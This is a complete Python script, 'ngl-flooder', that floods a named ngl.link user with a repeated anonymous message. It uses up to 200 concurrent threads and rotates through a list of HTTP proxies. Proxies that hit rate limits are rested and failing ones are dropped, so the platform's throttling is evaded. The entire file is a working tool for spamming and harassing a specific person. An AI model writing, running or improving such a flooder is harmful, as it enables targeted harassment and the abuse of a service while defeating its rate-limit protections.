import argparse
import os
import threading
import requests
import time

sent = 0
thread_count = 0

to_remove = []
being_used = []

HEADERS = {
    "content-type": "application/x-www-form-urlencoded"
}

parser = argparse.ArgumentParser(
    prog='ngl-flooder',
    description='Floods ngl.link with a given text and user.',
    epilog='Example: python3 main.py -u "username" -m "Hello"'
)

parser.add_argument('-u', '--user', type=str, help='Target NGL user', required=True)
parser.add_argument('-m', '--message', type=str, help='Message to send', required=True)
parser.add_argument('-p', '--proxy', type=str, help='File containing http proxies', default='proxy.txt')
parser.add_argument('-t', '--threads', type=int, help='Max number of threads', default=200)


def send_ngl(text: str, target: str, p: str) -> int:
    """Send a message to a target user using a proxy.

    :param text: Message to send
    :param target: Target user
    :param p: Proxy
    :return: Status code
    """
    payload = "question=" + text
    url = "https://ngl.link/" + target

    r = requests.post(url, data=payload, headers=HEADERS, proxies={"http": p, "https": p}, timeout=10)
    return r.status_code


def send_ngl_thread(text: str, target: str, p: str) -> None:
    global sent, thread_count
    thread_count += 1
    being_used.append(p)
    try:
        if proxies[p] < 10:
            status = send_ngl(text, target, p)
            if status == 200:
                proxies[p] = 0
                sent += 1
            elif status == 429:
                proxies[p] = time.time()
        else:
            if time.time() - proxies[p] > 60:
                proxies[p] = 0
    except Exception:
        proxies[p] += 1
        if proxies[p] == 10:
            to_remove.append(p)
    being_used.remove(p)
    thread_count -= 1


def print_thread() -> None:
    while True:
        os.system('cls||clear')
        print(f'User: {args.user}')
        print(f'Message: {args.message}')
        print(f'\nThread count: {thread_count}')
        print(f'\nmessages sent: {sent}')
        print(f'messages per second: {round(sent / (time.time() - start_time), 2)}')
        print(f'\nLoaded proxies: {len(proxies)}')
        print(f'Proxies in timeout: {len([i for i in proxies.values() if i > 10])}')
        print('\nClick CTRL+C to stop')
        time.sleep(1)


def main():
    for i, key in enumerate(to_remove):
        if key not in being_used:
            try:
                del proxies[key]
            except Exception:
                pass
            to_remove.remove(key)

    for key, value in proxies.items():
        if thread_count < args.threads:
            threading.Thread(target=send_ngl_thread, args=(args.message, args.user, key), daemon=True).start()
        else:
            time.sleep(.1)


if __name__ == '__main__':
    args = parser.parse_args()

    with open(args.proxy) as f:
        proxies = f.read().splitlines()

    proxies = {proxy: 0 for proxy in proxies}

    start_time = time.time()
    threading.Thread(target=print_thread, daemon=True).start()

    while True:
        try:
            main()
        except KeyboardInterrupt:
            break
